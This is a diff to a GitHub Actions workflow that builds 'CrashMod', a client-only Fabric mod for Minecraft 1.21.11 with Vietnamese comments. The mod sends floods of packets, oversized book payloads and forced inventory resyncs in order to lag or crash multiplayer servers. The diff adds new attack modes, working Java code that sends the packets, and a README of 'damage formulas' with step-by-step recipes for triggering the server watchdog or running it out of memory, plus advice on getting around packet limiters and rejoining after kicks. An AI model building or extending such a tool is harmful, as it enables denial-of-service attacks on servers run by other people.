@@ -39,7 +39,7 @@ env:
 jobs:
 
   # ==========================================================================
-  # JOB 0 - QUYET DINH: co test khong, co release khong
+  # JOB 0 - QUYET DINH
   # ==========================================================================
   decide:
     name: Quyet dinh (test / release)
@@ -84,23 +84,12 @@ jobs:
             echo "| ref | \`${{ github.ref }}\` |"
             echo "| Smoke test | **$S** |"
             echo "| Release | **$R** |"
-            echo ""
-            if [ "$S" = "co" ]; then
-              echo "Smoke test SE CHAY: job \`smoke-test\` se boot dedicated server that de xac nhan mod nap duoc."
-            else
-              echo "Smoke test BO QUA: build xong la het, khong boot server. Muon test thi chay workflow_dispatch voi \`smoke = co\`."
-            fi
           } >> "$GITHUB_STEP_SUMMARY"
 
           if [ "$S" = "co" ]; then
             echo "::notice title=Smoke test::SE CHAY - them khoang 1-5 phut de boot server"
           else
             echo "::notice title=Smoke test::BO QUA - build nhanh. Bat bang Actions > Run workflow > smoke = co"
-          fi
-          if [ "$R" = "co" ]; then
-            echo "::notice title=Release::SE TAO release"
-          else
-            echo "::notice title=Release::KHONG tao release"
           fi
 
   # ==========================================================================
@@ -138,7 +127,7 @@ jobs:
           loader_version=0.17.2
           fabric_version=0.141.6+1.21.11
           minecraft_range=~1.21
-          mod_version=2.1.0
+          mod_version=2.3.0
           maven_group=vn.venice.crashmod
           archives_base_name=crashmod
           EOF
@@ -213,7 +202,7 @@ jobs:
             "id": "crashmod",
             "version": "${version}",
             "name": "CrashMod",
-            "description": "Phim M mo GUI. 36 mode lam lag/sap server. Client-only.",
+            "description": "Phim M mo GUI tu BAT KY dau. 38 mode lam lag/sap server.",
             "authors": [ "Venice" ],
             "license": "MIT",
             "environment": "*",
@@ -276,6 +265,7 @@ jobs:
           package vn.venice.crashmod;
 
           import java.util.List;
+          import java.util.Set;
 
           public final class CrashRegistry {
 
@@ -293,65 +283,78 @@ jobs:
                       1, 2, 5, 10, 20, 50, 100, 250, 500, 1000,
                       2500, 5000, 10000, 50000, 100000);
 
+              /**
+               * Mode "ONCE": server chi lam duoc 1 lan moi tick (vd syncState() chi chay
+               * o cuoi tick), nen gui rate x100 cung vo nghia. Gui dung 1 packet.
+               */
+              private static final Set<String> ONCE_IDS = Set.of(
+                      "slot", "close_gui", "click", "resync", "swap_hand", "slot_flip",
+                      "book_s", "book_m", "book_x", "book_title", "book_click",
+                      "fill_inv", "fill_mix", "respawn");
+
               public static final List<Mode> MODES = List.of(
 
                   // ---- FLOOD: re tien, spam so luong lon, de bi limiter KICK ----
                   new Mode("swing",      G_FLOOD, "Swing",      1,
-                          "Flood re nhat, tay vung lien tuc. Dung de test ket noi truoc."),
+                          "Flood re nhat. Server chi phat animation. Dung de test ket noi."),
                   new Mode("look",       G_FLOOD, "Look",       2,
-                          "Gui goc nhin moi packet. Re, camera quay loan."),
+                          "Gui goc nhin moi packet. Re."),
                   new Mode("move",       G_FLOOD, "Move",       3,
                           "Gui full pos + yaw + pitch. Server chay movement check moi packet."),
                   new Mode("abilities",  G_FLOOD, "Abilities",  4,
-                          "Gui UpdatePlayerAbilities lien tuc. Re."),
+                          "Gui UpdatePlayerAbilities. Re nhat trong nhom."),
                   new Mode("input",      G_FLOOD, "Input",      5,
-                          "Gui PlayerInput, sneak bat/tat lien tuc -> server phai doi pose."),
+                          "Gui PlayerInput, sneak bat/tat -> server phai doi pose."),
                   new Mode("sprint",     G_FLOOD, "Sprint",     6,
                           "Gui START_SPRINTING lien tuc."),
 
                   // ---- BOMB: dat tien, moi packet work khong lo ----
                   new Mode("chat",       G_BOMB,  "Chat",        7,
-                          "Chat spam. Server tao message, ky/verify, broadcast, ghi log."),
+                          "Chat spam. Server tao message + broadcast + ghi log."),
                   new Mode("command",    G_BOMB,  "Cmd sai",     8,
                           "Gui lenh khong ton tai -> server parse Brigadier roi bao loi."),
                   new Mode("payload",    G_BOMB,  "Payload",     9,
-                          "Payload 0 byte. Server KHONG co mod -> WARN moi packet = LOG BOMB."),
+                          "Payload 0 byte. Server khong co mod -> WARN moi packet = log bomb."),
                   new Mode("payload_big",G_BOMB,  "Payload32K", 10,
                           "Payload 32KB. Server decode 32KB roi WARN moi packet."),
                   new Mode("tab",        G_BOMB,  "Tab",        11,
-                          "Xin goi y lenh '/'. Server gui ve TOAN BO command tree (ke ca plugin)."),
+                          "Xin goi y '/'. Server gui ve toan bo command tree."),
                   new Mode("tab_long",   G_BOMB,  "Tab dai",    12,
                           "Xin goi y voi chuoi 2000 ky tu -> nang CPU parse."),
                   new Mode("tab_many",   G_BOMB,  "Tab nhieu",  13,
-                          "Xin goi y voi prefix ngau nhien -> moi lan 1 ket qua khac."),
+                          "Xin goi y voi prefix ngau nhien."),
                   new Mode("sign",       G_BOMB,  "Sign bomb",  14,
-                          "Update sign 384 ky tu CA 2 MAT = 2 packet. CAN DUNG TREN SIGN THAT."),
+                          "Update sign 384 ky tu CA 2 MAT. CAN DUNG TREN SIGN THAT."),
                   new Mode("book_s",     G_BOMB,  "Book 25KB",  15,
                           "Sach 100 trang x 255 ky tu. CAN CAM SACH VA BUT."),
                   new Mode("book_m",     G_BOMB,  "Book 100KB", 16,
                           "Sach 100 trang x 1000 ky tu. CAN CAM SACH VA BUT."),
                   new Mode("book_x",     G_BOMB,  "Book 3MB",   17,
-                          "Sach 100 trang x 32767 ky tu (sat tran). CAN CAM SACH VA BUT."),
+                          "Sach 100 trang x 32767 ky tu. Nen ~1000:1 nen tren day chi ~30KB."),
                   new Mode("book_title", G_BOMB,  "Book+title", 18,
-                          "Book 3MB + title 512 ky tu -> item nang hon moi lan server sync."),
+                          "Book 3MB + title 512 ky tu."),
 
-                  // ---- GUI/INV: ep server resync inventory (he so nho nhat) ----
+                  // ---- GUI/INV: ep server resync inventory ----
                   new Mode("close_gui",  G_INV,   "Dong GUI",   19,
-                          "Gui 5 byte -> server syncState() gui lai TOAN BO inventory."),
+                          "5 byte -> server syncState() gui lai TOAN BO inventory. ONCE."),
                   new Mode("slot",       G_INV,   "Doi slot",   20,
-                          "Doi hotbar slot lien tuc."),
+                          "Doi hotbar slot. ONCE."),
                   new Mode("drop",       G_INV,   "Drop item",  21,
-                          "Drop 1 item moi packet -> tao ItemEntity. Het stack la dung."),
+                          "Drop 1 item moi packet -> ItemEntity. Het stack la dung."),
                   new Mode("click",      G_INV,   "Click inv",  22,
-                          "Click slot 0 voi revision SAI -> server resync full inventory."),
+                          "Click revision SAI -> resync full inventory. ONCE."),
                   new Mode("resync",     G_INV,   "Resync inv", 23,
-                          "Click slot 999 (ngoai dai) revision sai -> chi resync, khong doi item."),
+                          "Click slot 999 revision sai -> chi resync. ONCE. DON CHINH khi tui day sach."),
                   new Mode("button",     G_INV,   "Button GUI", 24,
                           "ButtonClick vao screen handler."),
                   new Mode("swap_hand",  G_INV,   "Swap hand",  25,
-                          "Doi tay chinh <-> tay phu -> server sync 2 slot."),
+                          "Doi tay chinh <-> tay phu. ONCE."),
                   new Mode("slot_flip",  G_INV,   "Lat slot",   26,
-                          "Nhay qua lai slot 0 <-> 8."),
+                          "Nhay qua lai slot 0 <-> 8. ONCE."),
+                  new Mode("fill_inv",   G_INV,   "Fill sach",  37,
+                          "Tu ghi sach 3MB vao tung slot 0-35 (1 slot/tick). CAN 36 SACH VA BUT."),
+                  new Mode("fill_mix",   G_INV,   "Fill khong nen", 38,
+                          "Nhu Fill sach nhung noi dung KHONG nen duoc -> nang duong truyen + RAM."),
 
                   // ---- CHUNK / STATUS ----
                   new Mode("chunk_hop",  G_CHUNK, "Chunk hop",  27,
@@ -359,19 +362,19 @@ jobs:
                   new Mode("move_chaos", G_CHUNK, "Move loan",  28,
                           "Gui goc nhin ngau nhien hoan toan."),
                   new Mode("respawn",    G_CHUNK, "Respawn",    29,
-                          "Gui PERFORM_RESPAWN. Chi an khi ban DANG CHET."),
+                          "PERFORM_RESPAWN. Chi an khi dang chet. ONCE."),
                   new Mode("stats",      G_CHUNK, "Stats",      30,
-                          "Xin bang thong ke -> server gui lai TOAN BO stats. 1 vao -> rat lon ra."),
+                          "1 packet -> server lap ~5000 stat + gui lai. NGAY moi packet. DON CPU CHINH."),
                   new Mode("interact",   G_CHUNK, "Right block",31,
                           "Chuot phai block duoi chan. Aim vao crafting table = mo GUI lien tuc."),
                   new Mode("use_item",   G_CHUNK, "Right item", 32,
                           "Chuot phai item tren khong (an / nem / ban)."),
                   new Mode("pick",       G_CHUNK, "Pick block", 33,
-                          "Pick block -> server tra cuu block state roi them item vao tui."),
+                          "Pick block -> server tra cuu block state + them item vao tui."),
 
                   // ---- COMBO ----
                   new Mode("book_click", G_COMBO, "Book+Click", 34,
-                          "Sach 3MB + click revision sai = DON OOM CHINH. Can cam sach va but."),
+                          "Sach 3MB + click revision sai. ONCE. Can cam sach va but."),
                   new Mode("nuke",       G_COMBO, "NUKE",       35,
                           "Quay vong 13 mode flood/bomb co ban."),
                   new Mode("nuke2",      G_COMBO, "NUKE 2",     36,
@@ -381,6 +384,11 @@ jobs:
               public static int codeOf(String id) {
                   for (Mode m : MODES) if (m.id().equals(id)) return m.code();
                   return 0;
+              }
+
+              public static boolean isOnce(int code) {
+                  for (Mode m : MODES) if (m.code() == code) return ONCE_IDS.contains(m.id());
+                  return false;
               }
           }
           EOF
@@ -426,11 +434,14 @@ jobs:
                   changed();
               }
 
-              /** Preset KILL: sach 3MB + ep resync + chunk hop + tab dai, rate 100 */
+              /**
+               * Preset KILL: resync (1 packet/tick, ep server gui lai ca inventory)
+               * + book_click (sach 3MB) + stats (2000 stat-packet/s o rate 100).
+               * Can co sach trong tui thi moi that su dau.
+               */
               public static void killPreset() {
                   enabled.clear();
-                  enabled.addAll(List.of(
-                          "book_click", "resync", "click", "close_gui", "chunk_hop", "tab_long"));
+                  enabled.addAll(List.of("resync", "book_click", "stats"));
                   rateIndex = CrashRegistry.RATES.indexOf(100);
                   changed();
               }
@@ -578,6 +589,8 @@ jobs:
               private Packets() {}
 
               private static int tx = 0;
+              private static int fillSlot = 0;
+
               private static final String LONG_CMD   = "/" + "a".repeat(2000);
               private static final String SIGN_LINE  = "A".repeat(384);
               private static final String BOOK_TITLE = "A".repeat(512);
@@ -586,8 +599,24 @@ jobs:
               private static final List<String> BOOK_100K = book(100, 1000);
               private static final List<String> BOOK_3M   = book(100, 32767);
 
+              /** Ban KHONG nen duoc: ky tu gia ngau nhien -> deflate gan nhu vo dung. */
+              private static final List<String> BOOK_MIX = mix(100, 32767);
+
               private static List<String> book(int pages, int chars) {
                   String unit = "A".repeat(chars);
+                  List<String> out = new ArrayList<>(pages);
+                  for (int i = 0; i < pages; i++) out.add(unit);
+                  return out;
+              }
+
+              private static List<String> mix(int pages, int chars) {
+                  StringBuilder sb = new StringBuilder(chars);
+                  int seed = 12345;
+                  for (int i = 0; i < chars; i++) {
+                      seed = seed * 1103515245 + 12345;
+                      sb.append((char) ('!' + Math.floorMod(seed >> 16, 90)));
+                  }
+                  String unit = sb.toString();
                   List<String> out = new ArrayList<>(pages);
                   for (int i = 0; i < pages; i++) out.add(unit);
                   return out;
@@ -684,6 +713,17 @@ jobs:
                       case 26 -> p.networkHandler.sendPacket(
                               new UpdateSelectedSlotC2SPacket(tx % 2 == 0 ? 0 : 8));
 
+                      // ghi sach vao TUNG slot -> lam day tui bang sach nang
+                      case 37 -> {
+                          bookSlot(p, fillSlot % 36, BOOK_3M, true);
+                          fillSlot++;
+                      }
+
+                      case 38 -> {
+                          bookSlot(p, fillSlot % 36, BOOK_MIX, true);
+                          fillSlot++;
+                      }
+
                       // ---------------- CHUNK / STATUS ----------------
                       case 27 -> {
                           if (Double.isNaN(hopX)) { hopX = p.getX(); hopZ = p.getZ(); }
@@ -721,7 +761,7 @@ jobs:
 
                       // ---------------- COMBO ----------------
                       case 34 -> {
-                          if (tx % 100 == 0) book(p, BOOK_3M, true);
+                          if (tx % 500 == 0) book(p, BOOK_3M, true);
                           click(p, (short) 0);
                       }
 
@@ -752,8 +792,12 @@ jobs:
               }
 
               private static void book(ClientPlayerEntity p, List<String> pages, boolean titled) {
+                  bookSlot(p, sel(p), pages, titled);
+              }
+
+              private static void bookSlot(ClientPlayerEntity p, int slot, List<String> pages, boolean titled) {
                   p.networkHandler.sendPacket(new BookUpdateC2SPacket(
-                          sel(p), pages,
+                          slot, pages,
                           titled ? Optional.of(BOOK_TITLE) : Optional.empty()));
               }
           }
@@ -773,6 +817,7 @@ jobs:
           import net.minecraft.util.Identifier;
           import org.lwjgl.glfw.GLFW;
           import vn.venice.crashmod.Config;
+          import vn.venice.crashmod.CrashRegistry;
 
           public class CrashModClient implements ClientModInitializer {
 
@@ -780,6 +825,9 @@ jobs:
 
               private static final KeyBinding.Category CATEGORY =
                       KeyBinding.Category.create(Identifier.of("crashmod", "main"));
+
+              /** trang thai phim o tick truoc - tu bat canh len, khong phu thuoc Screen */
+              private static boolean keyHeld = false;
 
               @Override
               public void onInitializeClient() {
@@ -790,11 +838,26 @@ jobs:
                           GLFW.GLFW_KEY_M, CATEGORY));
 
                   ClientTickEvents.END_CLIENT_TICK.register(client -> {
-                      while (openKey.wasPressed()) {
-                          if (client.currentScreen == null) client.setScreen(new ToggleScreen());
-                      }
+                      handleGuiKey(client);
                       tick(client);
                   });
+              }
+
+              /**
+               * Doc thang trang thai phim tu GLFW -> mo GUI duoc o BAT KY dau:
+               * title screen, menu, server list, trong world, dang mo chat, dang o inventory.
+               */
+              private static void handleGuiKey(MinecraftClient client) {
+                  InputUtil.Key bound = InputUtil.fromTranslationKey(openKey.getBoundKeyTranslationKey());
+
+                  if (bound.getCategory() == InputUtil.Type.KEYSYM) {
+                      boolean down = InputUtil.isKeyPressed(client.getWindow().getHandle(), bound.getCode());
+                      if (down && !keyHeld) ToggleScreen.toggle(client);
+                      keyHeld = down;
+                      while (openKey.wasPressed()) { }   // drain, tranh double-fire
+                  } else {
+                      while (openKey.wasPressed()) ToggleScreen.toggle(client);
+                  }
               }
 
               private static void tick(MinecraftClient client) {
@@ -804,7 +867,9 @@ jobs:
 
                   int rate = Config.rate();
                   for (int code : codes) {
-                      for (int i = 0; i < rate; i++) Packets.send(client, code);
+                      // mode ONCE: server chi lam duoc 1 lan/tick -> gui 1 packet, khong nhan rate
+                      int n = CrashRegistry.isOnce(code) ? 1 : rate;
+                      for (int i = 0; i < n; i++) Packets.send(client, code);
                   }
               }
           }
@@ -817,6 +882,7 @@ jobs:
 
           import net.minecraft.client.MinecraftClient;
           import net.minecraft.client.gui.screen.Screen;
+          import net.minecraft.client.gui.screen.ingame.HandledScreen;
           import net.minecraft.client.gui.widget.ButtonWidget;
           import net.minecraft.client.gui.widget.TextWidget;
           import net.minecraft.text.Text;
@@ -825,10 +891,35 @@ jobs:
 
           public class ToggleScreen extends Screen {
 
+              /** man hinh se quay ve khi dong GUI. null = ve game. */
+              private static Screen returnTo;
+
               private static String hint =
-                      "Bam 1 mode de doc ghi chu. Phim la M (khong phai Shift+M).";
+                      "Bam 1 mode de doc ghi chu. Mode do (CAM) chi gui 1 packet/tick.";
 
               public ToggleScreen() { super(Text.literal("CrashMod v2")); }
+
+              public static void toggle(MinecraftClient client) {
+                  Screen cur = client.currentScreen;
+
+                  if (cur instanceof ToggleScreen) {
+                      Screen back = returnTo;
+                      returnTo = null;
+                      client.setScreen(back);
+                      return;
+                  }
+
+                  returnTo = (cur instanceof HandledScreen) ? null : cur;
+                  client.setScreen(new ToggleScreen());
+              }
+
+              @Override
+              public void close() {
+                  MinecraftClient mc = MinecraftClient.getInstance();
+                  Screen back = returnTo;
+                  returnTo = null;
+                  mc.setScreen(back);
+              }
 
               private static void rebuild() {
                   MinecraftClient.getInstance().setScreen(new ToggleScreen());
@@ -845,8 +936,9 @@ jobs:
               }
 
               private static Text label(CrashRegistry.Mode m) {
-                  return Text.literal(colorOf(m.group())
-                          + (Config.isOn(m.id()) ? "[x] " : "[ ] ") + m.label());
+                  String tag = Config.isOn(m.id()) ? "[x] " : "[ ] ";
+                  String once = CrashRegistry.isOnce(m.code()) ? "\u00a78" : "";
+                  return Text.literal(colorOf(m.group()) + tag + once + m.label());
               }
 
               private void line(Text text, int y, int centerX, MinecraftClient mc) {
@@ -859,31 +951,38 @@ jobs:
                   MinecraftClient mc = MinecraftClient.getInstance();
                   int centerX = this.width / 2;
 
-                  int cols = 4, colW = 110, h = 16, gapX = 5, gapY = 1;
+                  int cols = 4, colW = 110, h = 15, gapX = 5, gapY = 1;
                   int totalW = cols * colW + (cols - 1) * gapX;
                   int startX = centerX - totalW / 2;
 
-                  boolean hasBook = mc.player != null && Packets.holdingBook(mc.player);
+                  boolean inWorld = mc.player != null && mc.getNetworkHandler() != null;
+                  boolean hasBook = inWorld && Packets.holdingBook(mc.player);
 
-                  line(Text.literal("\u00a7fphim M  \u00a78|  \u00a7abat: \u00a7f" + Config.enabled.size()
-                          + "  \u00a78|  \u00a7arate: \u00a7f" + Config.rate()
-                          + " pkt/tick  \u00a78(= " + (Config.rate() * 20) + " pkt/s)"), 4, centerX, mc);
+                  line(Text.literal(inWorld
+                          ? "\u00a7fphim M  \u00a78|  \u00a7abat: \u00a7f" + Config.enabled.size()
+                            + "  \u00a78|  \u00a7arate: \u00a7f" + Config.rate()
+                            + " pkt/tick  \u00a78(mode xam bo qua rate)"
+                          : "\u00a7fphim M  \u00a78|  \u00a7abat: \u00a7f" + Config.enabled.size()
+                            + "  \u00a78|  \u00a7arate: \u00a7f" + Config.rate()
+                            + "  \u00a7eCHUA VAO SERVER \u00a78- chua gui packet"), 3, centerX, mc);
 
-                  line(Text.literal(hasBook
-                          ? "\u00a7asach tren tay: CO \u00a78- book bomb san sang"
-                          : "\u00a7csach tren tay: KHONG \u00a78- cam SACH VA BUT de dung Book*"),
-                          13, centerX, mc);
+                  line(Text.literal(!inWorld
+                          ? "\u00a78vao world roi thi mode da bat se tu chay"
+                          : hasBook
+                              ? "\u00a7asach tren tay: CO \u00a78- book bomb san sang"
+                              : "\u00a7csach tren tay: KHONG \u00a78- cam SACH VA BUT de dung Book*"),
+                          12, centerX, mc);
 
                   line(Text.literal("\u00a77FLOOD \u00a7eBOMB \u00a7bGUI/INV \u00a7dCHUNK \u00a7cCOMBO"
-                          + "  \u00a78|  \u00a77cang do cang manh, cang de bi KICK"), 22, centerX, mc);
+                          + "  \u00a78|  \u00a77xam = ONCE (1 packet/tick, khong tinh rate)"), 21, centerX, mc);
 
-                  line(Text.literal("\u00a78" + hint), 31, centerX, mc);
+                  line(Text.literal("\u00a78" + hint), 30, centerX, mc);
 
                   int i = 0;
                   for (CrashRegistry.Mode m : CrashRegistry.MODES) {
                       final CrashRegistry.Mode mode = m;
                       int x = startX + (i % cols) * (colW + gapX);
-                      int y = 42 + (i / cols) * (h + gapY);
+                      int y = 40 + (i / cols) * (h + gapY);
                       addDrawableChild(ButtonWidget.builder(label(mode), b -> {
                           hint = mode.label() + ": " + mode.hint();
                           Config.toggle(mode.id());
@@ -893,7 +992,7 @@ jobs:
                   }
 
                   int rows = (CrashRegistry.MODES.size() + cols - 1) / cols;
-                  int sy = 42 + rows * (h + gapY) + 4;
+                  int sy = 40 + rows * (h + gapY) + 4;
 
                   addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7c-"), b -> {
                       Config.bumpRate(-1); rebuild();
@@ -925,7 +1024,7 @@ jobs:
           # ======================= README ======================= #
           if [ ! -f README.md ]; then
           cat > README.md <<'EOF'
-          # CrashMod v2.1 — Minecraft 1.21.11
+          # CrashMod v2.3 — Minecraft 1.21.11
 
           Client-only. **Server KHONG can cai.** Chi can Fabric Loader + Fabric API o phia client.
 
@@ -934,22 +1033,53 @@ jobs:
           2. Bo **Fabric API** vao `.minecraft/mods/`
           3. Bo `crashmod-1.21.11-*.jar` vao `.minecraft/mods/`
 
-          Vao duoc world = mod da nap. Khong can op, khong can cai gi len server.
-
           ## Mo bang dieu khien
-          Vao world, bam phim **M**.
+          Bam phim **M**. Mo duoc o BAT KY dau: title screen, menu, server list, trong world,
+          dang mo chat / pause / inventory. **KHONG can vao server van mo duoc.**
 
-          - GUI ghi "Shift+M" nhung phim that la **M** (khong co Shift).
-          - Khong mo duoc khi dang o inventory / chat / sach -> bam `Esc` truoc.
+          - Bam M lan nua hoac `Esc` / nut **Dong** de dong.
           - Doi phim: Options > Controls > CrashMod.
-          - Dong GUI: `Esc` hoac nut **Dong**.
+
+          ---
+
+          # DOC CAI NAY TRUOC KHI BAO "MOD KEM"
+
+          Server lai **1 thread chay 20 tick/s**. Muon sap no thi phai lam 1 trong 3:
+          1 tick > 60s (watchdog kill), het heap, hoac nghen netty.
+
+          Client-only nghia la ban bi gioi han boi **duong truyen cua ban**. Nen:
+          **dung do bang rate, do bang CPU server tren moi byte ban gui.**
+
+          ## 3 hieu lam chet nguoi
+
+          1. **Sach 'A' x 32767 nen duoc ~1000:1.** "3MB" la 3MB *sau giai nen*.
+             Tren day no chi ~30KB. Nen `Book 3MB` rate 2-5 = 40-100 cuon/s thi
+             **client ban moi la thang chet truoc** (phai deflate 3.3MB x 40), server khong thay gi.
+          2. **Rate cao cho `click`/`resync`/`close_gui` la vo nghia.** Server chi
+             `sendContentUpdates()` **1 lan moi tick**. 1000 packet click = van 1 lan gui inventory.
+          3. **`payload`/`swing`/`look`/`move` la packet re.** Day rate 50000 chi ton CPU client.
+
+          ## Trong tam dung
+
+          | Do | Client gui | Server phai lam |
+          |---|---|---|
+          | `Stats` | ~15 byte | lap ~5000 stat + build map + gui lai, **NGAY moi packet** |
+          | `resync` + **tui day sach 3MB** | 5 byte | serialize + deflate **ca inventory, moi tick** |
+          | `fill_mix` | 0 | noi dung khong nen -> nghen duong truyen |
+
+          ## Mode xam = ONCE
+
+          Cac mode hien chu **xam** chi gui **1 packet/tick** du rate bao nhieu, vi server
+          cung chi lam duoc 1 lan/tick. Rate khong anh huong chung. Dung rate cao cho chung la phi.
+
+          ---
 
           ## GUI co gi
-          - Dong 1: phim, so mode dang bat, rate (pkt/tick). pkt/s = rate x 20.
-          - Dong 2: canh bao sach tren tay (do = chua cam sach va but).
+          - Dong 1: phim, so mode dang bat, rate (pkt/tick).
+          - Dong 2: canh bao sach tren tay.
           - Dong 3: bang mau theo nhom.
           - Dong 4: ghi chu cua mode vua bam.
-          - 36 nut mode, 4 cot. `[x]` = dang bat.
+          - 38 nut mode, 4 cot. `[x]` = dang bat, chu xam = ONCE.
           - Nut: `-` `+` `KILL` `BAT HET` `TAT HET` `Dong`
 
           ## Mau = nhom
@@ -961,31 +1091,57 @@ jobs:
           | tim | CHUNK | di chuyen / status / interact |
           | do | COMBO | preset to hop |
 
-          ## 3 quy tac dung dung
-          1. Bat **MOT** mode truoc, xem ket qua, roi moi chong them. Bat het ngay tu dau thi khong biet cai nao giet duoc no.
-          2. **Rate la packet moi tick.** pkt/s = rate x 20.
-          3. **Mode can dung item / dieu kien:**
-             - `Book*` + `Book+Click` -> phai cam **sach va but**
-             - `Drop` -> phai co item tren tay (het stack la dung)
-             - `Sign bomb` -> phai dung ngay tren **sign that**
-             - `Right block` / `Pick block` -> phai dung tren **khoi ran** (block duoi chan)
-             - `Respawn` -> chi an khi ban **dang chet**
-             - `Right item` -> phai cam item dung duoc (do an, thuoc, cung)
-
-          ## Rate goi y
+          ## Rate goi y (chi ap dung cho mode KHONG phai xam)
           | Mode | Rate |
           |---|---|
-          | Swing / Look / Move / Abilities / Input / Sprint | 500 - 10000 |
-          | Chat / Cmd sai / Tab / Tab dai / Tab nhieu | 100 - 2000 |
-          | Payload / Payload32K | 1000 - 10000 |
-          | Click inv / Resync inv / Dong GUI / Swap hand | 100 - 2000 |
-          | Book 25KB | 5 - 20 |
-          | Book 100KB | 2 - 10 |
-          | Book 3MB / Book+title | 1 - 5 |
-          | Book+Click | 50 - 200 |
+          | Swing / Look / Move / Abilities / Input / Sprint | 500 - 5000 |
+          | Chat / Cmd sai / Tab / Tab dai / Tab nhieu | 50 - 500 |
+          | Payload / Payload32K | 500 - 5000 |
+          | Stats | 200 - 2000 |
+          | Drop / Button / Right block / Right item / Pick | 100 - 1000 |
           | Chunk hop | 5 - 50 |
-          | Stats / Right block / Pick block | 100 - 2000 |
+          | Move loan | 20 - 200 |
           | NUKE / NUKE 2 | 10 - 100 |
+
+          Mode ONCE (xam) bo qua rate: slot, close_gui, click, resync, swap_hand, slot_flip,
+          book_s, book_m, book_x, book_title, book_click, fill_inv, fill_mix, respawn.
+
+          ---
+
+          # CONG THUC SAT THUONG
+
+          ## A. Don CPU — `Stats` (nhe nhat, manh nhat)
+          1. Bat `Stats`, rate **500**.
+          2. Moi packet 15 byte -> server lap ~5000 stat + serialize + gui lai.
+          3. Tick 20k-100k lan -> tick 10-60s -> **watchdog kill**.
+          4. Client khong phai nen gi (packet nho hon nguong nen).
+
+          ## B. Don inventory — sat thuong cao nhat
+          Chuan bi: 36 **sach va but** (creative hoac craft). Writable book stack 16,
+          component dinh CA STACK -> ghi 1 cuon la 16 cuon trong slot do nang 3.3MB.
+
+          1. Cam 1 cuon. `BAT HET` tat. Bat `Fill sach`. De ~40 tick cho no ghi het slot 0-35.
+          2. Tat `Fill sach`. Tui ban gio chua 36 slot x 16 cuon x 3.3MB = **~1.9GB**.
+          3. Bat `Resync inv`. Rate **1** la du.
+          4. Moi tick server phai serialize + deflate 1.9GB -> **tick 5-20s, TPS 0**.
+          5. Them `Stats` rate 200 -> them CPU.
+
+          Neu muon **OOM** thay vi lag: dung `Fill khong nen` (fill_mix). Noi dung
+          khong nen duoc -> 1.9GB phai di that tren day -> netty queue phinh -> OOM.
+
+          ## C. Do client chiu duoc
+          `Fill sach` + `Resync inv` nang o CA HAI phia. Client yeu thi:
+          chi fill 9 slot hotbar, hoac dung `Book 100KB` thay `Book 3MB`.
+
+          ## D. Chong bi kick
+          Paper/Purpur mac dinh co packet-limiter 500 packet / 7 giay = ~71 pkt/s.
+          `Stats` rate 500 = 10.000 pkt/s -> **KICK ngay**. Chon 1 trong 2:
+          - rate <= 3 (nhung `Stats` se yeu)
+          - hoac de bi kick, vao lai, spam tiep
+
+          ## KILL preset
+          Bam `KILL` = `resync` + `book_click` + `stats` rate 100.
+          Can co sach trong tui thi moi that su dau.
 
           ## Test nhanh mod co an khong
           | Bat | Phai thay |
@@ -993,29 +1149,14 @@ jobs:
           | `Swing` rate 20 | tay vung lien tuc |
           | `Look` rate 20 | camera quay loan |
           | `Chat` rate 5 | chat spam "CrashMod 1, 2, 3..." |
-          | `Cmd sai` rate 5 | server tra `Unknown command: crashmod1` |
-          | `Book 100KB` rate 2 | mo sach thay day chu A |
-          | `Stats` | bang thong ke lon gui ve lien tuc |
-          | `Payload` | khong thay gi tren client, chi thay trong log server |
-
-          ## Kich ban 5 phut dau
-          1. Vao cho **dat trong, phang**.
-          2. `Swing` rate 100 -> xem server chiu duoc gi.
-          3. `TAT HET`. Cam sach va but. `Book 3MB` rate 2, dung yen 5 giay.
-          4. Tat `Book 3MB`. Bat `Click inv` rate 200 -> don OOM.
-          5. Server van song: `BAT HET` + rate 50000 (chi voi server khong limiter).
-
-          ## Chong bi kick (KHONG phai sap server)
-          Paper / Purpur mac dinh co packet-limiter: **500 packet / 7 giay** = ~71 pkt/s
-          -> **rate <= 3** moi khong bi kick `Sent too many packets`.
-          Vanilla / Spigot khong co limiter -> tha ho rate 1000 - 100000.
+          | `Book 100KB` | mo sach thay day chu A |
+          | `Stats` | server bat dau tut TPS |
 
           ## Luu y
-          - Config luu o `.minecraft/config/crashmod.properties`. Mode dang bat **van con** sau khi restart game -> vao server moi la flood ngay tu tick dau. Muon sach thi `TAT HET` truoc khi thoat.
-          - Bat mode o **menu chinh khong gui packet nao** (chua co player/connection).
-          - Rate 100000 x nhieu mode -> **client ban co the sap truoc server**. Cap client >= 4GB RAM hoac ha rate.
-          - `Chunk hop` KHONG lam man hinh ban bay - server moi la ben bay. Tat mode co the bi keo ve / roi / ngop block.
-          - Bi kick khac voi server sap. Kick thi vao lai spam tiep.
+          - Config luu o `.minecraft/config/crashmod.properties`. Mode van bat sau khi restart.
+          - `Chunk hop` KHONG lam man hinh ban bay - server moi la ben bay.
+          - Bi kick khac voi server sap.
+          - `BAT HET` la do: no tron mode ONCE voi mode flood. Muon do dung thi bat tay.
           EOF
           fi
 
@@ -1075,7 +1216,6 @@ jobs:
         with:
           name: source
 
-      # cache nay duoc job smoke-test dung lai -> boot server nhanh hon nhieu
       - name: Cache Minecraft dev env (loom)
         uses: actions/cache@v4
         with:
@@ -1140,7 +1280,7 @@ jobs:
     steps:
       - name: Thong bao
         run: |
-          echo "::notice title=Smoke test::Dang chay vi smoke=co. Neu khong can, lan sau chon 'khong'."
+          echo "::notice title=Smoke test::Dang chay vi smoke=co."
 
       - uses: actions/checkout@v4
 
@@ -1157,7 +1297,6 @@ jobs:
         with:
           name: source
 
-      # restore tu cache job build -> khong phai remap Minecraft lai
       - name: Cache Minecraft dev env (loom)
         uses: actions/cache@v4
         with:
